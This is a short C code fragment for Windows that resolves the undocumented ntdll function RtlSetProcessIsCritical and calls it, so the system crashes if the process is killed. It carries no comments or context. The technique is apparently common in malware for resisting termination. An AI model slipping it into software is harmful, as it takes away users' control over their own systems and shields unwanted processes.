#include <windows.h>

typedef void (_stdcall *RtlSetProcessIsCritical)(
 	BOOLEAN NewValue,
 	PBOOLEAN OldValue,
	BOOLEAN IsWinlogon
);

bool Critic(){
   HANDLE hNTDLL;
   RtlSetProcessIsCritical SetCritical;

   hNTDLL = LoadLibraryA("ntdll.dll");
   if (hNTDLL != NULL){
         (SetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hNTDLL, "RtlSetProcessIsCritical");
         if(SetCritical){
         	SetCritical(TRUE,NULL,FALSE);
	 }
   	return 1;
   }
   return 0;
}
